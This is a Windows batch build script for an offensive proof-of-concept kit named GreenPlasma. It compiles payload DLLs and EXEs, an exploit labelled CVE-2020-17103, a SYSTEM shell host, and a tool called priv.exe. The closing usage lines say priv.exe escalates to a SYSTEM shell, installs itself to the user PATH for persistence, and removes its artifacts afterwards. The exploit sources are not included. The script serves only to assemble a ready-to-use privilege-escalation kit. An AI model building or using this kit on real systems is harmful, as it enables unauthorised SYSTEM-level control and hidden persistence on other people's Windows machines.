@echo off
:: Build GreenPlasma POC
:: Requires: VS Developer Command Prompt (cl.exe on PATH)

echo [*] Compiling GreenPlasma.cpp...
cl.exe GreenPlasma.cpp ^
    /nologo /W3 /O2 /EHsc ^
    /DUNICODE /D_UNICODE /D_CRT_SECURE_NO_WARNINGS /DUMDF_USING_NTSTATUS ^
    /link advapi32.lib user32.lib
if errorlevel 1 (echo [-] GreenPlasma build failed & exit /b 1)
echo [+] Build successful: GreenPlasma.exe

echo [*] Compiling ctf_alpc.c ...
cl.exe ctf_alpc.c /nologo /W3 /O2 /MT /D_CRT_SECURE_NO_WARNINGS ^
    /link ntdll.lib advapi32.lib user32.lib shlwapi.lib
if errorlevel 1 (echo [-] ctf_alpc build failed & exit /b 1)
echo [+] Build successful: ctf_alpc.exe

echo [*] Compiling payload.c ...
cl.exe payload.c /nologo /LD /MT /D_CRT_SECURE_NO_WARNINGS ^
    /link /OUT:payload.dll kernel32.lib user32.lib
if errorlevel 1 (echo [-] payload build failed & exit /b 1)
echo [+] Build successful: payload.dll

echo [*] Compiling reg_tip.c ...
cl.exe reg_tip.c /nologo /O2 /MT /D_CRT_SECURE_NO_WARNINGS ^
    /link advapi32.lib
if errorlevel 1 (echo [-] reg_tip build failed & exit /b 1)
echo [+] Build successful: reg_tip.exe

echo [*] Compiling payload_exe.c (SYSTEM proof EXE)...
cl.exe payload_exe.c /Fe:payload_exe.exe /nologo /O2 /MT /D_CRT_SECURE_NO_WARNINGS ^
    /link kernel32.lib advapi32.lib user32.lib
if errorlevel 1 (echo [-] payload_exe build failed) else (echo [+] Build successful: payload_exe.exe)

echo [*] Compiling miniplasma.cs (CVE-2020-17103)...
where csc.exe >nul 2>&1
if errorlevel 1 (
    set CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
) else (
    set CSC=csc.exe
)
%CSC% /nologo /platform:x64 /optimize /out:miniplasma.exe miniplasma.cs
if errorlevel 1 (echo [-] miniplasma build failed) else (echo [+] Build successful: miniplasma.exe)

echo [*] Compiling syshost.c (SYSTEM shell host)...
cl.exe syshost.c /Fe:syshost.exe /nologo /O2 /MT /D_CRT_SECURE_NO_WARNINGS ^
    /link kernel32.lib
if errorlevel 1 (echo [-] syshost build failed) else (echo [+] Build successful: syshost.exe)

echo [*] Compiling priv.cs (interactive SYSTEM shell tool)...
%CSC% /nologo /platform:x64 /optimize /out:priv.exe priv.cs
if errorlevel 1 (echo [-] priv build failed) else (echo [+] Build successful: priv.exe)

echo.
echo Usage:
echo   priv.exe           - escalate + open SYSTEM shell in this terminal
echo   priv.exe install   - install to user PATH (persistent)
echo   priv.exe --unpriv  - cleanup all artifacts + uninstall
echo   priv.bat           - portable version (no install, auto-cleanup)
